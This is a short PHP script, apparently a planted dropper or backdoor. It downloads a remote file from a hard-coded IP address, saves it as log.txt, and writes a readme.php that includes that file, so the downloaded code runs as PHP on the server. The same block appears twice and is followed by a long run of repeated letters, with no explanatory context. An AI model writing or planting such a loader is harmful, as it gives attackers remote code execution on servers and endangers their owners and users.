<?php
$path = "log.txt";
$data = file_get_contents("http://121.40.188.41/js/a.txt");
file_put_contents($path,$data);
$npath = "readme.php";
$ndata = "<?php require_once(\"log.txt\");?>";
file_put_contents($npath,$ndata);
?>
<?php
$path = "log.txt";
$data = file_get_contents("http://121.40.188.41/js/a.txt");
file_put_contents($path,$data);
$npath = "readme.php";
$ndata = "<?php require_once(\"log.txt\");?>";
file_put_contents($npath,$ndata);
?>
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa